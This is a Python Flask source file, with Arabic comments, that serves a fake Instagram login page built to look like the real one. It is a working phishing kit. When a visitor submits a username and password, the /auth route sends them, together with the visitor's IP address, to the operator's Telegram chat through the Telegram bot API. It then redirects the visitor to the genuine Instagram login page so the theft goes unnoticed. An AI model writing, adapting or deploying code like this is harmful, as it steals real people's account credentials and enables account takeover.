import os
import requests
from flask import Flask, request, render_template_string, redirect

# هذا هو السطر الذي يبحث عنه Render (يجب أن يكون اسمه app)
app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('DEVELOPER_ID')

HTML_INSTA = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; box-sizing: border-box; text-align: center; }
        .logo { margin: 22px auto 12px; width: 175px; height: 51px; background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png'); background-size: contain; background-repeat: no-repeat; }
        input { width: 100%; padding: 9px 7px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; font-size: 14px; }
        .footer { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
        .footer a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo"></div>
        <form method="POST" action="/auth">
            <input type="text" name="u" placeholder="اسم المستخدم أو الهاتف" required>
            <input type="password" name="p" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <div class="footer">ليس لديك حساب؟ <a href="#">تسجيل</a></div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_INSTA)

@app.route('/auth', methods=['POST'])
def auth():
    user = request.form.get('u')
    pw = request.form.get('p')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_msg = f"📸 **[حساب Instagram جديد]**\n━━━━━━━━━━━━━━━\n👤 **اليوزر:** `{user}`\n🔑 **الباسورد:** `{pw}`\n━━━━━━━━━━━━━━━\n🌐 **IP:** `{user_ip}`"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ADMIN_ID, "text": log_msg, "parse_mode": "Markdown"})
    except: pass
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    # التأكد من استخدام البورت الصحيح لـ Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
